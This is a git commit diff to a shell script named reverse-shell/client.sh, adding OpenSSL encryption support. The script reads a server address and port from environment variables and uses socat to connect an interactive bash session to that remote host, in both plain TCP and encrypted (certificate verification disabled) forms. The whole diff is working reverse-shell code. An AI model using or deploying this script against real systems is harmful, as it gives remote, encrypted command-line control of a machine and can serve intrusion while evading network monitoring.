e1575da9abf6804cee55b3e7bd9c34d7fbda4795
Spencer Heywood <github@heywoodlh.io>
2025-10-27 19:17:32 -0600

    reverse-shell: support openssl encryption

--- reverse-shell/client.sh
+++ reverse-shell/client.sh
@@ -1,12 +1,21 @@
 #!/bin/ash
+# shellcheck shell=bash
 
 # Check for required env variables
 error="false"
-[[ -z ${SERVER_ADDRESS} ]] && echo "SERVER_ADDRESS variable not set." && error="true"
-[[ -z ${SERVER_PORT} ]] && echo "SERVER_PORT variable not set." && error="true"
+[[ -z "${SERVER_ADDRESS}" ]] && echo "SERVER_ADDRESS variable not set." && error="true"
+[[ -z "${SERVER_PORT}" ]] && echo "SERVER_PORT variable not set." && error="true"
 # Exit if error encountered
 [[ "${error}" == "true" ]] && echo "Error encountered. Exiting" && exit 1
 
 # Invoke reverse shell, using bash for better tty experience
-echo "Invoking reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
-socat EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw tcp:${SERVER_ADDRESS}:${SERVER_PORT}
+if [ "${ENABLE_SSL}" == "true" ]
+then
+  echo "Invoking encrypted reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
+  set -ex
+  socat OPENSSL:"${SERVER_ADDRESS}:${SERVER_PORT}",verify=0 EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw
+else
+  echo "Invoking unencrypted reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
+  set -ex
+  socat EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw "tcp:${SERVER_ADDRESS}:${SERVER_PORT}"
+fi
